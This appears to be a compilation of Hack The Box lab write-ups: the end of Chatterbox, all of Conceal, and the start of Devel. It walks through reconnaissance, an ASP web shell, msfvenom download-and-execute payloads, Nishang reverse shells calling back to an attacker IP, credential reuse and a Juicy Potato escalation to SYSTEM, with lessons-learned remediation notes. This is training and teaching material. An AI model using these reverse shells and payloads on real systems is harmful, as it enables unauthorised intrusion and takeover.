![](https://miro.medium.com/max/681/1*8FN10LxJCfJHt2nDF_lwrw.png)

We have full access \(F\) on the _Desktop_ directory. The Alfred user is also configured to own the _root.txt_ file.

![](https://miro.medium.com/max/781/1*RB_nedflS2Jh2bnGom60fQ.png)

So we can simply grant ourselves access to it using the following command.

![](https://miro.medium.com/max/758/1*s6zsv0MsAAp0sp3n7NlOUA.png)

View the permissions again to confirm that the change was made.

![](https://miro.medium.com/max/649/1*YJVoWD189gUyAnYoOtuTjQ.png)

Perfect! We should now be able to view the _root.txt_ flag.

![](https://miro.medium.com/max/567/1*5AV9M9Ls6XTQ2SO-gkwbAQ.png)

Alright, all we did is view the root flag, we didn’t really escalate privileges. Unfortunately our shell can’t handle running PowerShell, so in the next section, we’ll start from the beginning and send a PowerShell reverse shell back to our target machine and from there we’ll escalate our privileges to _Administrator_.

## Extra Content: The PowerShell Solution <a id="e858"></a>

View the options for PowerShell reverse shells in msfvenom.

![](https://miro.medium.com/max/1385/1*HLwepNg6SyWiuGIPICQGVA.png)

We’ll go with the _powershell\_reverse\_tcp_ option.

```text
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Unfortunately, this gives us a payload that is larger than the maximum size specified in the exploit.

![](https://miro.medium.com/max/1421/1*R2cIHjSY_Wf1ANRH_2L_UQ.png)

So instead, we’ll just use the _windows/exec_ module to download and execute the [Nishang](https://github.com/samratashok/nishang) reverse shell.

Download the [Nishang](https://github.com/samratashok/nishang) repository and copy the _Invoke-PowerShellTcp.ps1_ script into your current directory.

```text
cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1
```

Add the following line to the end of the script with the attack machine configuration settings.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234
```

When called, this sends a reverse shell back to our attack machine on port 1234.

Setup a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Next, use msfvenom to generate a payload that downloads the PowerShell script and executes it.

```text
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

We get back the following result.

```text
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 684 (iteration=0)
x86/unicode_mixed chosen with final size 684
Payload size: 684 bytes
Final size of python file: 3330 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
.....[redacted]
```

Good! The payload size is 684 bytes, so it’s within the limit. Copy the payload and add it in place of the payload included in the exploit.

Start up a python server in the directory that the PowerShell script resides in.

```text
python -m SimpleHTTPServer 5555
```

Run the exploit.

```text
root@kali:~/Desktop/htb/chatterbox# python 36025.py 
---->{P00F}!
```

We get a PowerShell shell!

![](https://miro.medium.com/max/943/1*BqwL-qWlNezkn5G9g4eKFw.png)

We’ll use the [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) script to determine if there are any misconfigurations that lead to privilege escalation.

Upload and run the script on the target machine.

```text
PS C:\Users\Alfred\Desktop> iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/PowerUp.ps1')PS C:\Users\Alfred\Desktop> Invoke-AllChecks
```

We get back two interesting results.

```text
[*] Checking for Autologon credentials in registry...DefaultDomainName    : 
DefaultUserName      : Alfred
DefaultPassword      : Welcome1!
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   :[*] Checking for unattended install files...UnattendPath : C:\Windows\Panther\Unattend.xml
```

Viewing the _Unattend.xml_ file, we see that the password was redacted. So let’s focus on the Autologon credentials. The default username is “_Alfred_” and the default password is “_Welcome1!_”. I don’t have much experience with Windows, so I googled [Autologin credentials](https://support.microsoft.com/en-ca/help/324737/how-to-turn-on-automatic-logon-in-windows) to learn more about it.

![](https://miro.medium.com/max/1148/1*oR22IbW1Do-rN8XOfFjtjQ.png)

As stated in the article, these credentials are stored in the registry in plain text. The manual commands for extracting these credentials are:

```text
PS C:\Windows\system32> (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName                                                                                                                         
Alfred                                                                                                                                               PS C:\Windows\system32> (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword                                                                                                                         
Welcome1!
```

These credentials are set by the administrator. Since users have a tendency to reuse passwords, let’s see if the administrator account is set to the same password.

To do that, first run the following command to convert the plain text string “_Welcome1!_” into a secure string and store the result in the _$password_ variable.

```text
$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
```

* **ConvertTo-SecureString**: Converts plain text to secure strings.
* **-AsPlainText**: Specifies a plain text string to convert to a secure string.
* **-Force**: Confirms that you understand the implications of using the _AsPlainText_ parameter and still want to use it.

Second, create a new object to store these credentials.

```text
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
```

Third, we’ll use these credentials to start PowerShell and send a \(hopefully privileged\) reverse shell back to our attack machine.

In the attack machine, copy the _shell.ps1_ script we used earlier and save it in the file _shell-admin.ps1_.

```text
cp shell.ps1 shell-admin.ps1
```

Change _shell-admin.ps1_ to send a reverse shell to our attack machine on port 6666.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666
```

Setup a python server in the directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

Setup a listener to receive the reverse shell.

```text
nc -nlvp 6666
```

On the target machine, use the credentials to start PowerShell to download the _shell-admin.ps1_ script, run it and send a reverse shell back to our attack machine.

```text
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:5555/shell-admin.ps1')" -Credential $cred
```

We get a shell with administrator privileges!

![](https://miro.medium.com/max/767/1*FzEuxFT88c3h8BlJVEsEVg.png)

Now we can view the _root.txt_ flag without having to change the ACL permissions on it.

![](https://miro.medium.com/max/785/1*Bf2Jui2BxcVzj2W4SI-wIg.png)

## Lessons Learned <a id="a720"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. Buffer Overflow vulnerability. The AChat chat service being used was vulnerable to a known remote buffer overflow vulnerability. This allowed us to execute shell code on the box and send a reverse shell back to our attack machine. Since this is a known vulnerability, the administrator should have used the patched version of AChat or completely disabled the service if a patch is not available.

To escalate privileges we exploited three vulnerabilities.

1. Security misconfiguration. The _Alfred_ user had full access on the _Administrator_ directory and owned the _root.txt_ file. Although we weren’t initially able to view the _root.txt_ file, we did own it so we simply granted ourselves access to view the file. The administrator should have conformed to the principle of least privilege when setting up user permissions.
2. Automatic logon credentials saved in plaintext. Again, I’m not too familiar with the Windows system, but it seems like there is an option to store [automatic logon credentials in encrypted form](https://docs.microsoft.com/en-us/windows/win32/secauthn/protecting-the-automatic-logon-password). This way, as a non-privileged user we wouldn’t have been able to access these credentials.
3. Reuse of credentials. The administrator had setup his password to be the same as the password used for automatic logon. Since these credentials are saved in cleartext in the registry, we were able to view them and start up a PowerShell process that sent a privileged reverse shell back to our attack machine in the context of the Administrator user. It goes without saying that you should definitely not reuse credentials, especially when setting up a non-privileged account where the credentials will be stored in plaintext.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
conceal-writeup-w-o-metasploit.md
# Conceal Writeup w/o Metasploit

![](https://miro.medium.com/max/593/1*UMj8ECCKxnwvcQbJkB2sBw.png)

## Reconnaissance <a id="d0a6"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.116 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
root@kali:~/Desktop/htb/conceal# nmapAutomator.sh 10.10.10.116 AllRunning all scans on 10.10.10.116Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 23:19 EST
Nmap done: 1 IP address (1 host up) scanned in 101.60 seconds---------------------Starting Nmap Basic Scan---------------------No ports in quick scan.. Skipping!----------------------Starting Nmap UDP Scan----------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 23:20 EST
Nmap scan report for 10.10.10.116
Host is up (0.051s latency).
Not shown: 999 open|filtered ports
PORT    STATE SERVICE
500/udp open  isakmpNmap done: 1 IP address (1 host up) scanned in 188.61 secondsMaking a script scan on UDP ports: 500Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 23:23 EST
/usr/local/bin/nmapAutomator.sh: line 164:  1941 Segmentation fault      $nmapType -sCVU --script vulners --script-args mincvss=7.0 -p$(echo "${udpPorts}") -oN nmap/UDP_"$1".nmap "$1"---------------------Starting Nmap Full Scan----------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 23:23 EST
Initiating Parallel DNS resolution of 1 host. at 23:23
Completed Parallel DNS resolution of 1 host. at 23:23, 0.02s elapsed
Initiating SYN Stealth Scan at 23:23
Scanning 10.10.10.116 [65535 ports]
Nmap scan report for 10.10.10.116
Host is up.
All 65535 scanned ports on 10.10.10.116 are filteredRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27315.03 seconds
           Raw packets sent: 131070 (5.767MB) | Rcvd: 2 (168B)Making a script scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 06:59 EST
Error #486: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"
QUITTING!---------------------Finished all Nmap scans---------------------
```

We have one open port.

* **Port 500:** running isakmp

Before we move on to enumeration, let’s make some mental notes about the scan results.

* I’m not familiar with the service that is running on port 500. A quick google search tells us that it is the Internet Security Association and Key Management Protocol\( ISAKMP\) which is commonly called Internet Key Exchange \(IKE\). A lot of the documentation references configuring IPsec and ISAKMP standards to build VPNs.
* So there are probably other ports that are open, however, we won’t be able to see them before we establish that VPN connection. In order to do that, we need some kind of key for authentication and since this is an HTB box, we have to find this key somewhere. So what we’ll do is rerun all the nmap scans to see if we missed any ports the first time around.

## Enumeration <a id="2871"></a>

Rerunning the UDP scan does give us an extra port.

```text
root@kali:~# nmap -vvv -sU -sV 10.10.10.116
....
Discovered open port 161/udp on 10.10.10.116
```

Port 161 is open. This usually runs the SNMP service. Let’s check that using nmap.

```text
nmap -p 161 -sU -sC -sV 10.10.10.116
```

* **-p:** port
* **-sU:** UDP scan
* **-sC:** run default scripts
* **-sV:** version detection

We get back the following result.

![](https://miro.medium.com/max/873/1*uZ6_DrTMjU7enGttQNhcKg.png)

The port is running SNMP version 1 and was able to query the service using the default “_public_” community string. We see that there are a bunch of ports that are open including FTP, HTTP and SMB. We won’t get access to these ports until we establish a secure connection.

For now, we can only interact with the SNMP and ISAKMP ports. Let’s first query SNMP for any sensitive information.

```text
snmpwalk -c public -v 1 10.10.10.116 > snmp-public.txt
```

* **-c:** community string
* **-v:** SNMP version

We get back the following result.

```text
root@kali:~/Desktop/htb/conceal# cat snmp-public.txt iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"                
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1                                                                                                                         
iso.3.6.1.2.1.1.3.0 = Timeticks: (305519) 0:50:55.19                                                                                                                           
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"                                                                                        
iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"                                                                                                                                        
iso.3.6.1.2.1.1.6.0 = ""                                                                                                                                                       
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
iso.3.6.1.2.1.2.1.0 = INTEGER: 15
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
```

It leaks the IKE VPN password hash!

```text
root@kali:~# echo -n 9C8B1A372B1878851BE2C097031B6E43 | wc -c
32
```

This looks like an MD5 hash. Let’s use the [CrackStation](https://crackstation.net/) to crack it.

![](https://miro.medium.com/max/894/1*-yCPGVP92izJ5pSCKrSvQw.png)

Now that we have a plaintext password, let’s try and establish a connection to the VPN.

First run _ike-scan_ to determine the IKE implementation and configuration that the host is using.

```text
ike-scan -M 10.10.10.116
```

* **-M:** multiline

We get back the following result.

![](https://miro.medium.com/max/1172/1*JuIqr2xdr61RyrjVy3sLcA.png)

Next, we’ll use _strongswan_ to establish the IPsec connection. This does not come preinstalled on Kali. To install it, run the following command.

```text
apt-get install strongswan
```

We have to make changes to two files: _ipsec.secrets_ and _ipsec.conf_.

In the _/etc/ipsec.secrets_, add the following entry.

```text
10.10.14.7 10.10.10.116 : PSK "Dudecake1!"
```

In the _/etc/ipsec.conf_, add the following entry.

```text
conn conceal                                                                                                                                                                                             
        authby=secret                                                                                                                                                                                    
        auto=route                                                                                                                                                                                       
        keyexchange=ikev1                                                                                                                                                                                
        ike=3des-sha1-modp1024                                                                                                                                                                           
        left=10.10.14.7                                                                                                                                                                                  
        right=10.10.10.116                                                                                                                                                                               
        type=transport                                                                                                                                                                                   
        esp=3des-sha1                                                                                                                                                                                    
        rightprotoport=tcp
```

Then run the following command to establish the connection.

```text
root@kali:~# ipsec up concealgenerating QUICK_MODE request 1899279807 [ HASH SA No ID ID ]
sending packet: from 10.10.14.7[500] to 10.10.10.116[500] (196 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.7[500] (188 bytes)
parsed QUICK_MODE response 1899279807 [ HASH SA No ID ID ]
selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
detected rekeying of CHILD_SA conceal{32}
CHILD_SA conceal{33} established with SPIs cea2f2d0_i fbdc1ee6_o and TS 10.10.14.7/32 === 10.10.10.116/32[tcp]
generating QUICK_MODE request 1899279807 [ HASH ]
connection 'conceal' established successfully
```

Perfect, the connection was established successfully. Now let’s try and run an nmap scan.

```text
root@kali:~/Desktop/htb/conceal# nmap 10.10.10.116
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 00:24 EST
Nmap scan report for 10.10.10.116
Host is up (0.047s latency).
All 1000 scanned ports on 10.10.10.116 are filteredNmap done: 1 IP address (1 host up) scanned in 49.03 seconds
```

The default TCP SYN scan \(-sS\) does not seem to work, but a TCP connect scan does.

```text
root@kali:~/Desktop/htb/conceal# nmap -sT 10.10.10.116
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 00:26 EST
Nmap scan report for 10.10.10.116
Host is up (0.042s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-dsNmap done: 1 IP address (1 host up) scanned in 2.65 seconds
```

I have no idea why you would need a TCP connect scan for it to work. However, in the interest of moving forward, let’s run a more comprehensive TCP connect scan.

```text
root@kali:~/Desktop/htb/conceal# nmap -sC -sV -sT -o nmap-vpn.text 10.10.10.116Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-27 20:39 EST
Nmap scan report for 10.10.10.116
Host is up (0.041s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:
|_clock-skew: 2m18s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-28T01:41:47
|_  start_date: 2020-02-27T01:56:42Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.89 seconds
```

## More Enumeration <a id="cc3e"></a>

I always start off with enumerating HTTP.

### **Port 80 HTTP** <a id="51c9"></a>

Visit the application in the browser.

![](https://miro.medium.com/max/1188/1*ViKiH2tFT9AIJ-vaKESWOA.png)

We get the default Windows Microsoft IIS welcome page. The page source doesn’t contain any sensitive information.

Next, run gobuster to enumerate directories/files.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.116 -o gobuster.txt
```

* **dir:** directory mode
* **-w:** wordlist
* **-u:** URL
* **-o:** output file

We get back the following result.

![](https://miro.medium.com/max/1063/1*2Erei0XdUfVqC43MC4v8JQ.png)

Visit the directory in the browser.

![](https://miro.medium.com/max/612/1*pOD8gN3ZrDqL-9lepXJw3g.png)

It doesn’t contain anything. Let’s see if we can upload files through FTP.

### **Port 21 FTP** <a id="9ba0"></a>

The nmap scan showed anonymous login is allowed.

```text
root@kali:~/Desktop/htb/conceal/upload# ftp 10.10.10.116Connected to 10.10.10.116.
220 Microsoft FTP Service
Name (10.10.10.116:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp>
```

Let’s test if we’re allowed to upload files. Create a _test.txt_ file on the attack machine.

```text
echo "hello" > test.txt
```

Upload the _test.txt_ file on the FTP server.

```text
ftp> put test.txt                                                                    
local: test.txt remote: test.txt                                                     
200 PORT command successful.                                                         
125 Data connection already open; Transfer starting.                                 
226 Transfer complete.                                                               
7 bytes sent in 0.00 secs (78.5740 kB/s)
```

The upload was successful. Let’s see if we can execute the file from the _/upload_ directory on the web server.

![](https://miro.medium.com/max/614/1*IsQ9pz_uu4uAFyAEw-PyFA.png)

Perfect! According to the nmap scan, this is a Microsoft IIS server version 10, so it should be able to execute ASP and ASPX code. Let’s test this out on the web server.

Create a _test.aspx_ file on the attack machine and upload it on the FTP server in the same way we did before. Then execute the file from the _/upload_ directory on the web server.

![](https://miro.medium.com/max/1017/1*CC08xJvj5SbdzlQyyJaUng.png)

We get an HTTP error saying that the file can’t be served because of the extension configuration. So we can’t upload ASPX files. Next, let’s try an ASP file.

Create a _test.asp_ file on the attack machine and upload it on the FTP server in the same way we did before. Then execute the file from the _/upload_ directory on the web server.

![](https://miro.medium.com/max/563/1*JXvfQMesSBnzSHoEZGugLA.png)

Perfect, it does execute ASP code! We’ll use this to gain an initial foothold on the system.

## Initial Foothold <a id="22c8"></a>

Create a _cmd.asp_ file on the attack machine that contains the following simple web shell.

```text
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

The above code executes the _whoami_ command and outputs it on the screen. Upload the _cmd.asp_ file on the FTP server and view it on the browser.

![](https://miro.medium.com/max/798/1*jumMYZLn6cHZhJmXlkwH5A.png)

We have code execution! Download the [Nishang](https://github.com/samratashok/nishang) repository and copy the _Invoke-PowerShellTcp.ps1_ script into your current directory.

```text
cp ../../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1
```

Add the following line to the end of the script with the attack machine configuration settings.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234
```

When called, this sends a reverse shell back to our attack machine on port 1234.

Setup a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Next, change the _cmd.asp_ file to download the PowerShell script and execute it.

```text
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Start up a python server in the directory that the shell script resides in.

```text
python -m SimpleHTTPServer 5555
```

Upload the _cmd.asp_ file on the FTP server and view it on the browser.

![](https://miro.medium.com/max/801/1*zHVh8nxaQxjprpyKmSHDOw.png)

We get a shell! Grab the _user.txt_ flag.

![](https://miro.medium.com/max/650/1*elQ-E-q4GYfsIhvY5kKZ4A.png)

## Privilege Escalation <a id="90be"></a>

Run the _systeminfo_ command.

```text
PS C:\Users\Destitute\Desktop> systeminfo
                                                                                                                     
Host Name:                 CONCEAL                                                                                   
OS Name:                   Microsoft Windows 10 Enterprise                                                                                  
OS Version:                10.0.15063 N/A Build 15063                                                                                       
OS Manufacturer:           Microsoft Corporation                                                                                            
OS Configuration:          Standalone Workstation                                                                                           
OS Build Type:             Multiprocessor Free                                                                                                              
Registered Owner:          Windows User                                                                                                                     
Registered Organization:                                                                                                                                                       
Product ID:                00329-00000-00003-AA343                                                                                                                             
Original Install Date:     12/10/2018, 20:04:27                                                                                                                                
System Boot Time:          27/02/2020, 01:56:19                                                                                                                                
System Manufacturer:       VMware, Inc.                                                                                                                                        
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,154 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 2,213 MB
Virtual Memory: In Use:    986 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.116
                                 [02]: fe80::4e1:f9b6:e5da:2f16
                                 [03]: dead:beef::71d9:f571:4c90:5dc7
                                 [04]: dead:beef::18b2:9ba4:e093:98b9
                                 [05]: dead:beef::4e1:f9b6:e5da:2f16
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We’re on a Microsoft Windows 10 Enterprise 64-bit OS. Let’s first check the system privileges that are enabled for this user.

![](https://miro.medium.com/max/966/1*kjcJF1T-lm39Ew1tTfxg-Q.png)

_SetImpersonatePrivilege_ is enabled so we’re very likely to get SYSTEM using [Juicy Potato](https://github.com/ohpe/juicy-potato). Users running the SQL server service or the IIS service usually have these privileges enabled by design. This privilege is designed to allow a service to impersonate other users on the system. Juicy Potato exploits the way Microsoft handles tokens in order to escalate local privileges to SYSTEM.

Let’s test it out. Grab the Juicy Potato executable from [here](https://github.com/ohpe/juicy-potato/releases) and transfer it to the target machine using the following command.

```text
(new-object net.webclient).downloadfile('http://10.10.14.7:5555/JuicyPotato.exe', 'C:\Users\Destitute\Desktop\jp.exe')
```

Run the executable file to view the arguments it takes.

![](https://miro.medium.com/max/942/1*MXutASCD9YtJArLqrfz0Tg.png)

It requires 3 mandatory arguments.

* **-t:** Create process call. For this option we’ll use \* to test both options.
* **-p:** The program to run. We’ll need to create a file that sends a reverse shell back to our attack machine.
* **-l:** COM server listen port. This can be anything. We’ll use 4444.

First copy the _Invoke-PowerShellTcp.ps1_ script once again into your current directory.

```text
cp ../../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell-2.ps1
```

Add the following line to the end of the script with the attack configuration settings.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666
```

When called, this sends a reverse shell back to our attack machine on port 6666.

Next, create a _shell.bat_ file that downloads the above _shell-2.ps1_ PowerShell script and runs it.

```text
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell-2.ps1')
```

Then download the _shell.bat_ file on the target machine.

```text
(new-object net.webclient).downloadfile('http://10.10.14.7:5555/shell.bat', 'C:\Users\merlin\Desktop\shell.bat')
```

Setup a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 6666
```

Then run the Juicy Potato executable. This should attempt to get a token that impersonates SYSTEM and then run our _shell.bat_ file with elevated privileges.

```text
PS C:\Users\Destitute\Desktop> ./jp.exe -t * -p shell.bat -l 4444
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
COM -> recv failed with error: 10038
```

It fails to escalate privileges with the default CLSID. We can get the list of CLSIDs on our system using [this script](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). However, let’s first manually try one of the Windows 10 Enterprise CLSIDs available on the Juicy Potato [github repo](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise).

![](https://miro.medium.com/max/943/1*U4HIsLXdLBxuUF0uM8YuYw.png)

Rerun the Juicy Potato executable with the above specific CLSID.

```text
PS C:\Users\Destitute\Desktop> ./jp.exe -p shell.bat -l 4444 -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 4444
......
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM[+] CreateProcessWithTokenW OK
```

We get a shell back with SYSTEM privileges!

```text
root@kali:~# nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.116] 49720
Windows PowerShell running as user CONCEAL$ on CONCEAL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.PS C:\Windows\system32>whoami
nt authority\system
```

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/773/1*wrgTg1a8biAroZNnFerpMQ.png)

## Lessons Learned <a id="3860"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. Outdated version of SNMP and the use of default SNMP community string. The community string essentially acts as a password to gain access to the service. Using the default “public” string, we were able to query SNMP for the IKE VPN hashed password. The administrator should have instead used SNMPv3 since it’s the only version that provides strong authentication and data encryption. If it is necessary that version 1 be used, the administrator should have changed the community string to one that is not easily guessable.
2. Weak authentication credentials. The shared secret used to establish a secure connection was cracked in a matter of seconds using an online password cracker. The administrator should have either used a stronger shared key that is difficult to crack or considered using asymmetric encryption.
3. Insecure configuration of FTP server that allowed anonymous login and file upload. The administrator should have disabled anonymous access to the FTP server. If anonymous access was necessary, the administrator should have configured the FTP server to only allow downloads. This way we would not have been able to upload a reverse shell.

To escalate privileges we didn’t necessarily exploit a vulnerability but an intended design of how Microsoft handles tokens. So there’s really not much to do there but put extra protections in place for these sensitive accounts.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
devel-writeup-w-o-metasploit.md
# Devel Writeup w/o Metasploit

![](https://miro.medium.com/max/591/1*oMFTLi_I0i-lq_2w1AzKVQ.png)

## Reconnaissance <a id="794e"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.5
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that port 80 is open with Microsoft IIS web server running on it and port 21 is open with FTP running on it.

![](https://miro.medium.com/max/1020/1*d_RU0N6p7Jq3L2U4xjWB_A.png)

